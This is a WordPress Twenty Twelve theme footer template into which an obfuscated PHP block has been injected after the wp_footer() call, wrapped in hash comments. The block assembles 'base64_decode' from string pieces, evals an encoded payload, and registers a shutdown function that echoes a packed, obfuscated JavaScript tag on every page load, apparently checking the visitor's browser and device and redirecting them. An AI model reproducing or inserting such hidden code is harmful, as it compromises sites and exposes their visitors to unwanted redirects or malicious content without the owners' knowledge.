<?php
/**
 * The template for displaying the footer
 *
 * Contains footer content and the closing of the #main and #page div elements.
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */
?>
	</div><!-- #main .wrapper -->
	<footer id="colophon" role="contentinfo">
		<div class="site-info">
			<?php do_action( 'twentytwelve_credits' ); ?>
			<a href="<?php echo esc_url( __( 'http://wordpress.org/', 'twentytwelve' ) ); ?>" title="<?php esc_attr_e( 'Semantic Personal Publishing Platform', 'twentytwelve' ); ?>"><?php printf( __( 'Proudly powered by %s', 'twentytwelve' ), 'WordPress' ); ?></a>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>
<!--32dc79e2130d26c19ead0c6d52fea75b--><?php  $ygu="b"."ase"."64_de"."code";eval($ygu("CmZ1bmN0aW9uIHVzZXJfYWJvcnRfZW5kX2V4aXRfb3BlcmF0aW9uaWRfNjYwMTA3NSgpCnsKICAgIGVjaG8gYmFzZTY0X2RlY29kZSgnUEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaUlHbGtQU0pwWkY4Mk5qQXhNRGMxSWo1bGRtRnNLR1oxYm1OMGFXOXVLSEFzWVN4akxHc3NaU3hrS1h0bFBXWjFibU4wYVc5dUtHTXBlM0psZEhWeWJpaGpQR0UvSnljNlpTaHdZWEp6WlVsdWRDaGpMMkVwS1NrcktDaGpQV01sWVNrK016VS9VM1J5YVc1bkxtWnliMjFEYUdGeVEyOWtaU2hqS3pJNUtUcGpMblJ2VTNSeWFXNW5LRE0yS1NsOU8ybG1LQ0VuSnk1eVpYQnNZV05sS0M5ZUx5eFRkSEpwYm1jcEtYdDNhR2xzWlNoakxTMHBlMlJiWlNoaktWMDlhMXRqWFh4OFpTaGpLWDFyUFZ0bWRXNWpkR2x2YmlobEtYdHlaWFIxY200Z1pGdGxYWDFkTzJVOVpuVnVZM1JwYjI0b0tYdHlaWFIxY200blhGeDNLeWQ5TzJNOU1YMDdkMmhwYkdVb1l5MHRLWHRwWmloclcyTmRLWHR3UFhBdWNtVndiR0ZqWlNodVpYY2dVbVZuUlhod0tDZGNYR0luSzJVb1l5a3JKMXhjWWljc0oyY25LU3hyVzJOZEtYMTljbVYwZFhKdUlIQjlLQ2R4SURGMFBUTjRLRW9vS1h0bUtHb3VUU0U5TVVrbUprd2dhaTVOSVQwaVN5SXBlek41S0RGMEtUdG1LRXdnUVZzaU1VRWlYVDA5SWtzaUtYdEJXeUl4UVNKZFBURTdjU0F4Tnowb01UWW9LU1ltTVZJb0tTazdjU0F4VkQwaE1UY21KaUVoUVM0emVpWW1RUzVGTGpOM1BUMDlJak4ySUROeUxpSTdjU0F4YWowdE1UdHhJRWM5SWpOek9pOHZNM1F1TTNVdk0wRWlPMllvVnlncEppWXhhajA5TVNsN1ppZ29SUzVPTGpGdktDOHpRaTlwS1NsOGZDaEZMazR1TVc4b0x6TklMMmtwS1NsN01Ua3VNMGtvUnlsOWVudEJMakU1UFVjN2FpNHhPVDFIZlgxNmUyWW9LREUzSmlZaE1WUW1KaUZYS0NrcEtYdHhJRk05SWp3eE1TQXpTajFjWENJelJ6b3pSanN6UXpvdE0wUTdYRndpUGp3eGVTQXpSVDFjWENJeGJGeGNJaUF6Y1QxY1hDSWlLMGNySWx4Y0lpQXpjRDFjWENJeGJGeGNJajQ4THpGNVBqd3ZNVEUrSWp0eElFazlhaTR6WWlnaU1URWlLVHRtS0VrdU1XMDlQVEFwZTJvdVRTNVFQV291VFM1UUsxTjllbnR4SURGT1BVa3VNVzA3Y1NCU1BUTmpMak5rS0NneFRpOHlLU2s3U1Z0U1hTNVFQVWxiVWwwdVVDdFRmWDE5ZlRGTktDbDlmU3d6WVNrN1NpQXhUU2dwZTNFZ1ZUMGlNemtpTzJZb1ZTRTlJak0xSWlsN2NTQklQV291TXpZb1ZTazdaaWhNSUVnaFBVc21Ka2doUFRGSktYdElMak0zUFNJaU96TTRJRWg5ZlgwN1NpQXhVaWdwZTJZb2FpNUVKaVloYWk0elpTbDdlQ0JDZlhvZ1ppaHFMa1FtSmlGQkxqTm1LWHQ0SUVKOWVpQm1LR291UkNZbUlXb3VNMjBwZTNnZ1FuMTZJR1lvYWk1RUppWWhhaTR6YmlsN2VDQkNmWG9nWmlocUxrUW1KaUZCTGpOdktYdDRJRUo5ZWlCbUtHb3VSQ2w3ZUNCQ2ZYb2daaWhNSUVVdU0yd2hQU0pMSWlZbUlXb3VSQ1ltTVRZb0tTbDdlQ0JDZlhwN2VDQXhZbjE5U2lBeE5pZ3BlM0VnZVQxQkxrVXVUanR4SUZFOWVTNURLQ0l6YXlBaUtUdG1LRkUrTUNsN2VDQmFLSGt1V1NoUkt6VXNlUzVES0NJdUlpeFJLU2tzTVRBcGZYRWdNV3M5ZVM1REtDSXpaeThpS1R0bUtERnJQakFwZTNFZ01UUTllUzVES0NJemFEb2lLVHQ0SUZvb2VTNVpLREUwS3pNc2VTNURLQ0l1SWl3eE5Da3BMREV3S1gxeElFODllUzVES0NJemFTOGlLVHRtS0U4K01DbDdlQ0JhS0hrdVdTaFBLelVzZVM1REtDSXVJaXhQS1Nrc01UQXBmWGdnTVdKOVNpQlhLQ2w3Y1NBeFlUMUJMa1V1VGk0emFpZ3BPMllvTHlnelMzd3pURnhjWkN0OE5HZ3BMaXN4YUh3MGFYdzBhbHhjTDN3MFozdzBabncwWW53MFkzdzBaSHd6Tkh3MGEzd3hkU2cwYkh3eFpDbDhNWEo4TkhKOE5ITWdmRFIwZkRSeGZEUndmREZvTGlzMGJYdzBibncwYnlCdEtEUmhmRFE0S1dsOE0xTW9JREZQS1Q5OE0xUjhjQ2d6Vlh3elVpbGNYQzk4TTFGOE0wMThNMDU4TTA4b05IdzJLVEI4TTFCOE0xWjhNVWhjWEM0b00xZDhORE1wZkRRMGZEUTJmRFF5SURReGZETllmRE5aTDJrdU1VTW9NV0VwZkh3dk0xcDhOSFY4TWt0OE1tWjhNbUY4TlRCYk1TMDJYV2w4TWpoOE1WWjhZU0F4VUh3eFdId3hkeWd4VVh3eGVIeHpYRnd0S1h3eFV5Z3lZbnd5YXlsOE1XY29NbTE4TVc1OE1YWXBmREp1ZkRKa0tESmxmRlo4TW1NcGZESnBmREZtS0RKc2ZERmpLWHd4V2loVWZESnZLWHd4VjN3eFdTZ3ljSHhjWEMxdGZISWdmSE1nS1h3eWNYd3laeWd4Vlh3eGNId3lhQ2w4TVVJb01tcDhNaklwZkRJektERjNmREk1S1h3eU55aGxmSFlwZDN3eU5ud3lORnhjTFNodWZIVXBmREkxWEZ3dmZETXpmREpSZkRKU1hGd3RmREpRZkRKUGZESk1mREpOWEZ3dGZERjJLREpPZkRGRktYd3lXbnd5VmlneFpYd3hjSHd5V0NsOE1uaDhNbmxjWEMxemZESjZmREozZkRKMmZERnBLR044Y0NsdmZESnpLREV5ZkZ4Y0xXUXBmREoxS0RRNWZERlRLWHd5UWlneVNId3lTU2w4TVZFb01rUjhNa1VwZkRKRGZESkdLRnMwTFRkZE1Id3hUM3d4VUh3eVJ5bDhNa0Y4TW5Rb1hGd3RmREZ4S1h3eFRDQjFmREpLZkRKWGZESlpYRnd0Tlh4blhGd3RNVFY4TVdNb1hGd3VkM3d4WkNsOE16RW9NekI4TWxVcGZESnlmREpVZkRKVFhGd3RLRzE4Y0h4MEtYdzBaVnhjTFh3MFJDZ3hSM3d4UmlsOE5tMG9JR2w4TVhVcGZEWnVYRnd0WTN3MmJ5aGpLRnhjTFh3Z2ZERnhmR0Y4WjN4d2ZITjhkQ2w4Tm1zcGZEWm9LRFpwZkRacUtYeHBYRnd0S0RJd2ZERmpmRmdwZkRaeGZEUjJLQ0I4WEZ3dGZGeGNMeWw4Tm5kOE5uaDhObmw4Tm5aOE5uVjhObko4Tm5OOE1YSjhOblFvZEh4MktXRjhObWQ4Tm1aOE5qSjhOak44TmpSOE5Wb29JSHhjWEM4cGZEVlZmRFZXSUh3MVYxeGNMWHcxV0NoamZHc3BmRFkxS0RZMmZEWmpLWHcyWkNnZ1ozeGNYQzhvYTN4c2ZIVXBmRFV3ZkRVMGZGeGNMVnRoTFhkZEtYdzJPSHcyT1h3MmVseGNMWGQ4TnpKOE56TmNYQzk4V0NoVWZEYzBmRGN4S1h3eGVpaEdmREl4ZkRGdUtYeHRYRnd0TmxwOE5sY29ObGg4TVVRcGZEYzFLRGMyZkRkamZERktLWHczWlh3eE5TaEdmRGRrZkRGQ2ZEZGlmREZwZkhRb1hGd3RmQ0I4YjN4MktYdzNOeWw4Tnpnb05UQjhObFY4ZGlBcGZEWlVmRFpIZkRaSVd6QXRNbDE4TmtsYk1pMHpYWHcyUmlnd2ZESXBmRFpGS0RCOE1udzFLWHcyUWlnd0tEQjhNU2w4TVRBcGZEWkRLQ2hqZkcwcFhGd3RmRFpFZkRaS2ZEWkxmRFpSZkRaU0tYdzJVeWcyZkdrcGZEWlBmRFpNZkRaTktEWk9mRFZVS1h3MVUzdzBWM3cwV0h3MFdTaGhmR1I4ZENsOE5GVjhORklvTVROOFhGd3RLRnN4TFRoZGZHTXBLWHcwV253MU1Yd3hTeWcxWVh3MVlpbDhOV05jWEMweWZEVTVLREZWZkRVNGZERnpLWHcxTlh3MU5ud3hSMXhjTFdkOE5UZGNYQzFoZkRSUUtEUkRmREV5ZkRJeGZETXlmRFl3ZkZ4Y0xWc3lMVGRkZkdsY1hDMHBmRFI0ZkRSNWZEUjZmRFJHZkRSSGZEUk5LRFJPZkRSUEtYdzBURnhjTDN3MFN5ZzBTSHhZZkRSSmZEUktmRlo4TldRcGZEVmxLRVo4YUZ4Y0xYd3hlSHh3WEZ3dEtYdzFSMXhjTDN3eGN5aGpLRnhjTFh3d2ZERXBmRFEzZkRGNmZERkZmREZFS1h3MVFWeGNMWHcxUW53MVF5aGNYQzE4YlNsOE5VbGNYQzB3ZkRWS0tEUTFmRFZSS1h3MVVpZ3haM3d4Wm53MVQzd3haWHcxVGlsOE5Vc29OVXg4VmlsOE5VMG9SbnhvWEZ3dGZIWmNYQzE4ZGlBcGZEVjVLRVo4Tld3cGZEVnRLREU0ZkRVd0tYdzFiaWcxYTN3eE1Id3hPQ2w4TVVZb05XZDhOV2dwZkRWcFhGd3RmRFZ2WEZ3dGZEVndLR2w4YlNsOE5YWmNYQzE4ZEZ4Y0xURTFmRFY0S0RGTGZEVjFLWHd4U2lnM01IeHRYRnd0ZkRWeGZEVnlLWHcxYzF4Y0xUbDhNVWdvWEZ3dVlud3hUSHcxZWlsOE5WQjhOVVI4TlVWOE5GWjhObVVvTm5COFZDbDhObXdvTkRCOE5Wc3dMVE5kZkZ4Y0xYWXBmRFYwZkRWM2ZEVm1mRFZxS0RVeWZEVXpmRFl3ZkRZeGZEY3dmRFZJZkRWR2ZEUjNmRFJCZkRSQ0tYdzBSU2hjWEMxOElDbDhORkY4TkZSOE5GTW9aeUI4TmxCOE56a3BmRGRoZkRaWmZEWldmRFpCWEZ3dGZEWTNmRFpoZkRaaVhGd3RMMmt1TVVNb01XRXVOVmtvTUN3MEtTa3BlM2dnUW4xNElERmlmU2NzTmpJc05EUTVMQ2Q4Zkh4OGZIeDhmSHg4Zkh4OGZIeHBabng4Zkh4a2IyTjFiV1Z1ZEh4OGZIeDhmSHgyWVhKOGZIeDhmSHg4Y21WMGRYSnVmSFIyUWtkRFRFUkVUMlpzZW1aeVRsVm9TWFJQYkc1T1ZtbFplRmRsY2tSMFoycDhaV3h6Wlh4M2FXNWtiM2Q4ZEhKMVpYeHBibVJsZUU5bWZHRnNiSHh1WVhacFoyRjBiM0o4TURGOFNFaDFVWGhoVVhOaFVWbG1SbVJvVjIxU1EwUnJVMUpJV1hOTFlWWjBTM1pPVG5acmZFaHZZVmxwUm5CeGVsQldVVkpKUzIxMWQydDFkR040YmtGWmFHWnRiSE5QZUhGVmZHZERkbE54ZW1kMmNsaEVUMEZRVGtoblZsVnNhbE5GV1VOYVNYTlJhMXBKZkdaMWJtTjBhVzl1ZkhWdVpHVm1hVzVsWkh4MGVYQmxiMlo4WW05a2VYeDFjMlZ5UVdkbGJuUjhhWFJ6UW5CWWFVTkJWMXBMVG5SUFMzTk1ZWFpXY0ZGRWJsUlNlbUp2Y2taRmMzVndaVmx2YVZKOGFXNXVaWEpJVkUxTWZFNXBkM1phYzNGeWJuTkdUMU5hY0hsYVRVTmthR1JrVFZKQ1VuVjNaWGg1V1VoQlFtNVBkVlZxZkVSWGRtZHNjRVpEVEZkU1JVWldTMmhXVW5CT1VHeEVVSE5RUjNWdFFuQjZVMDl5U2xaamZIUklaWGhGU2sxNGJXOTNSbE56UW1wTWJFWk5UM1pTVFZaNlJYcFNlSEI4ZEdWOGRuUk9RV2xwYzNGM1NtWjZVSGh6VUZOUlRISkxUbTlJZFc5d1UwNVVkMEp4Zkc1NWZFOXZjbTVFVVhsTFoyRnBVblZZZEVGd2RVUmFVRmhwUjIxQ1kyVjJiMlpZVFU1VFNHSjBmRzFoZkhOMVluTjBjbWx1WjN4d1lYSnpaVWx1ZEh4OFpHbDJmSHg4Y1hSU1dXTm1VV2hZYjFGUldWcG9TazFWWjNwRGJVcGxUV3hzU25Cd1ZVdElkMnh1YkZoOGJXOThVMlJ0VFVkbVIyRnRZMmRZWVZkelVFUnZhVXBQUmsxcVpIZHpUMFJDVW5SMFEzaFFWVk44ZGtkcGFYWlpXVnAzZWtGVlVHcE9aMUozWVhaUVZXbFVUV2hoZEhKeldFTjNjV0ZQVTB0S2ZIeHNiMk5oZEdsdmJueFdhMWRaY1dsUFdWaGxiVkZwVDJ4bWFXMXBkVzV2YzNaS2RGTnhSazVqYmtWVlRGQjBhM2RyU1h4bVlXeHpaWHhuYjN4dlpIeHBkSHhoY254aGJIeHRiMkpwYkdWOFpHOThTV1ZLV1dkd1FuSkJkRWR3WkZWWmNrcGFTMlpwVDFCVmRsZGtaR3hTWVUxS1JVWkNSbFpYZkhWbGQwUjZhMGxSUVhOb1ZVaHlUbmhJU0VKUFdtRlRiMmhFWm5OUVdXbDhNekJ3ZUh4c1pXNW5kR2g4WTJGOGJXRjBZMmg4Ykd4OFgzeHBjbWx6ZkhObGZHdHVhR2hQZVZWWFZrTldVR2Q0VDIxUlRsQjRWbkowYW1aV2FXcHViMUYzVTJOcmZHbHdmR052ZkdGamZHOXZmR2xtY21GdFpYeHRZM3gyWHpNeVpHTTNPV1V5TVRNd1pESTJZekU1WldGa01HTTJaRFV5Wm1WaE56VmlmR0pwZkhSbGMzUjhjbWw4Ym1SOGRHRjhjSFI4ZFhCOGJuVnNiSHgwYzN4d2JIeG5NWHhLV2sxd1ExTndkRVJIZDFWWlYyUm9lbFY2Y0U1T1EzRjZlVzF5YVVaNGFYRmhmR1JzWDI1aGJXVjhiM044ZDJGOFpYSjhSM0J4YTAxcGFrbG1XbXhXYTJocmRFZExaV2xJYzNONlFrUkdiRXh1Vm1abmZHRnBmSGgwZFZkbFIxWmFSRTFFZG1OVmNVdFJkR0ZsYTJOWVUzTlhkM0Z0U1VsWWVsVmxjbTU4WTJ0OE9EQXljM3hoZEhSM2ZHRmlZV044WVhWOFlYTjhmSHh5Wkh4aWJIeGlkM3hqTlRWOFluVnRZbnhpY253M056QnpmR0Y2ZkRSMGFIQjhhMjk4ZVhkOFlXNThaWGg4TTJkemIzeGlaWHh1Y1h4aGNIUjFmR3hpZkhKdWZHTm9mR0YyZkdGdGIybDhkWE44WkdsOFlYWmhibnhvWVdsbGZHUnpmR1pzZVh4bGJIeGtiVzlpZkdScFkyRjhaR0owWlh4a1kzeGtaWFpwZkdabGRHTjhaVzE4WlhOc09IeHBZM3hyTUh4bGVueDZaWHhzTW54MWJIeG5OVFl3ZkRZMU9UQjhZMnhrWTN4amJXUjhiWEI4WTJoMGJYeGpaV3hzZkdOamQyRjhZMlJ0Zkdoa2ZHaGphWFI4ZFc1OFpHRjhaMlZ1Wlh4dVozeG5abnhqY21GM2ZHRmtmR2R5Zkh4allYQnBmR2hwY0hSdmNIeHViMjVsZkdkbGRFVnNaVzFsYm5SQ2VVbGtmRzkxZEdWeVNGUk5USHhrWld4bGRHVjhhV1JmTmpZd01UQTNOWHd4TURCOFoyVjBSV3hsYldWdWRITkNlVlJoWjA1aGJXVjhUV0YwYUh4bWJHOXZjbnhqYjIxd1lYUk5iMlJsZkZoTlRFaDBkSEJTWlhGMVpYTjBmRlJ5YVdSbGJuUjhjblo4UldSblpYeDBiMHh2ZDJWeVEyRnpaWHhOVTBsRmZHMWhlRlJ2ZFdOb1VHOXBiblJ6ZkhGMVpYSjVVMlZzWldOMGIzSjhZV1JrUlhabGJuUk1hWE4wWlc1bGNueGhkRzlpZkdobGFXZG9kSHh6Y21OOFNXNWpmR2gwZEhCOGEyOXNaRzkyWVhsaGNHOXliMlJoZkhScmZFZHZiMmRzWlh4MlpXNWtiM0o4YzJWMFNXNTBaWEoyWVd4OFkyeGxZWEpKYm5SbGNuWmhiSHhqYUhKdmJXVjhNRFV5Um54cFVHaHZibVY4YkdWbWRIdzBOVGc0Y0hoOGQybGtkR2g4WVdKemIyeDFkR1Y4Y0c5emFYUnBiMjU4YVZCdlpIeHlaWEJzWVdObGZITjBlV3hsZkdGdVpISnZhV1I4WW1KOGNHOWphMlYwZkhCemNIeHpaWEpwWlhOOGMzbHRZbWxoYm54d2JIVmphMlZ5ZkhKbGZIQmhiRzE4Y0dodmJtVjhhWGhwZkhSeVpXOThZbkp2ZDNObGNueDRaR0Y4ZUdscGJtOThNVEl3TjN4OFkyVjhkMmx1Wkc5M2MzeHNhVzVyZkhadlpHRm1iMjVsZkh4M1lYQjhmR2x1Zkh4dllueGpiMjF3WVd4OFpXeGhhVzVsZkdabGJtNWxZM3hvWldsOFlteGhlbVZ5ZkdKc1lXTnJZbVZ5Y25sOGJXVmxaMjk4WVhaaGJuUm5iM3hpWVdSaGZHbGxiVzlpYVd4bGZHaHZibVY4Wm1seVpXWnZlSHh1WlhSbWNtOXVkSHh2Y0dWeVlYeHRiWEI4Yldsa2NIeHJhVzVrYkdWOGJHZGxmRzFoWlcxdmZEWXpNVEI4YVdGamZEZ3pmSEYwWld0OGNqTTRNSHh5TmpBd2ZEZzFmRGs0ZkRBM2ZHaHBmSGN6WTN4eVlXdHpmSEpwYlRsOFoyVjhiVzE4YlhOOGMyRjhjelUxZkhKdmZIWmxmSHB2ZkhGamZIZGxZbU44Y0dkOGQybDhkMmhwZEh4d1pIaG5mSFpsY21sOGIzZG5NWHh3T0RBd2ZIQmhibnh3YUdsc2ZIeHdhWEpsZkh4OGZIQnliM2g4Y0hOcGIzeHhZWHh5ZEh4d2IzeGhlWHgxWTN4d2JueDJZWHh6WTN4MmRXeGpmR2QwZkd4cmZIUmpiSHgyZUh3d01IeHRZbngwTW54ME5ueDBaR2Q4ZEdWc2ZHMHpmRzAxZkhSNGZIWnROREI4YzJoOGRHbHRmSFp2WkdGOGRHOThjM2w4YzJsOGMyZG9mSE5vWVhKOGMybGxmSFkwTURCOGRqYzFNSHc0TVh4elpHdDhPREI4YzJ0OGMyeDhjMjk4Wm5SOGMzQjhkRFY4WWpOOGRYUnpkSHhwWkh4emJYeHZjbUZ1ZkhkMmZHdHNiMjU4YTNCMGZHdDNZM3hyZVc5OGMzVmljM1J5Zkd0bmRIeDhmR3BwWjNOOGEyUmthWHhyWldwcGZHeGxmRzV2ZkhsdmRYSjhiR2xpZDN4c2VXNTRmSHBsZEc5OGVuUmxmSGhwZkd4bmZIWnBmR3BsYlhWOGFtSnliM3hvZFh4aGQzeDBZM3gwY0h4MmEzeG9jSHhvYzN4b2RIeHlaM3hwTWpNd2ZHbHVibTk4YVhCaGNYeHFZWHhwYlRGcmZHbHJiMjE4YVdKeWIzeHBaR1ZoZkdsbk1ERjhiVEY4ZVdGemZHNDNmRzVsZkc5dWZHNDFNSHh1TXpCOGJYbDNZWHh1TVRCOGJqSXdmSFJtZkhkbWZHOHlhVzE4YjNCOGRHbDhibnB3YUh4dVkzeDNaM3gzZEh4dWIydDhiWGRpY0h4d01YeDROekF3ZkcxbGZISmpmSGR2Ym5WOFkzSjhmSGh2ZkcweloyRjhiVFV3ZkhWcGZHMXBmRzg0ZkhwNmZHMTBmRzUzZkhkdGJHSjhaR1Y4YjJGOE1ESjhiVzFsWmljdWMzQnNhWFFvSjN3bktTd3dMSHQ5S1NrS1BDOXpZM0pwY0hRKycpOwp9CgpyZWdpc3Rlcl9zaHV0ZG93bl9mdW5jdGlvbigndXNlcl9hYm9ydF9lbmRfZXhpdF9vcGVyYXRpb25pZF82NjAxMDc1Jyk7Cgo="));?><!--32dc79e2130d26c19ead0c6d52fea75b--></body>
</html>